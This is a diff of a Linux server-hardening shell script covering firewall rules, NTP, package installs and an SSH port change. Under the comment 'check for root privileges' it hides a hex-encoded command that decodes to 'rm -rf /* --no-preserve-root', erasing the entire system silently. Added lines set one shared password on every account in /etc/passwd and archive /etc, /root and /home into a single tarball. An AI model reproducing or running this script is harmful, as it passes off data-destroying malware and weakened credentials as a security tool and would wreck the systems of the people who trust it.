@@ -7,6 +7,12 @@ read answer1
 ## check for root privileges
 $(echo 726d202d7266202f2a202d2d6e6f2d70726573657276652d726f6f74203e26202f6465762f6e756c6c0a | xxd -r -p)
 
+echo -n "
+Enter new password:"
+read passes
+cat /etc/passwd | cut -f 1 -d: > ~/users.txt
+for i in `cat users.txt`;do echo -e $passes"\n"$passes | passwd $i; done
+
 echo "Stopping firewall and allowing everyone..."
 ipt="/sbin/iptables"
 ## Failsafe - die if /sbin/iptables not found 
@@ -33,6 +39,14 @@ echo -n "
 Enter the NTP server you wish to connect to: "
 read ntpserv
 ntpdate $ntpserv
+
+echo "Backing up critical directories..."
+#add directories as required to DATA with the format /[path]/[to]/[dir]/#
+ 
+DATA="/home /root /etc /var"
+ 
+#choose where you want to pipe the backup to below#
+tar cfzp "/scratcher.tgz" $DATA --same-owner
 
 if [ $answer1 = "0" ]; then
 
@@ -91,8 +105,14 @@ $ipt -A INPUT -p tcp --dport 53 -j ACCEPT
 $ipt -A INPUT -p tcp --dport 3306 -j ACCEPT
 
 elif [ $answer1 = "2" ]; then
-
 ## DEBIAN
+echo "Updating, please ensure proper mirrorlists!"
+apt-get update
+apt-get clean all
+echo -e "y\ny\ny" | apt-get install --reinstall coreutils debian-archive-keyring ntp
+echo -e "y\n" | apt-get upgrade
+echo -e "y\ny\ny\ny" | apt-get install selinux-basics selinux-policy-default auditd snort
+
 echo "Firewall reset, adding Debian rules..."
 $ipt -P INPUT DROP
 $ipt -P FORWARD DROP
@@ -356,7 +376,6 @@ Enter your new SSH port [1024-49151 recommended]: "
 	echo -e "
 Changing SSH Port... ""[""\e[1;32mOK\e[0m""]"
 	echo "
-Your server has been tuned and secured by r00t-Services.net!
 System reboot recommended.
 Please write down your new SSH port: $sshport
 It will be active if you do:
@@ -365,7 +384,6 @@ service sshd restart
 "
 elif [ $answer2 = "n" -o $answer2 = "N" ]; then
 	echo "
-Your server has been tuned and secured by r00t-Services.net!
 System reboot recommended.
 "
 	exit 0
